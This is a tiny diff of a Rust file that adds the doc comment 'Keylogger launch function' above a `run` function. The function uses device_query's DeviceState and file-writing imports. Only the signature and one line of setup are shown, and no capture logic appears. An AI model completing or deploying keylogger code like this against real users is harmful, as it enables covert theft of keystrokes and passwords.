@@ -3,6 +3,7 @@ use device_query::{DeviceQuery, DeviceState};
 use std::fs::OpenOptions;
 use std::io::Write;
 
+/// Keylogger launch function
 pub fn run(path: String) {
     let device_state = DeviceState::new();
 
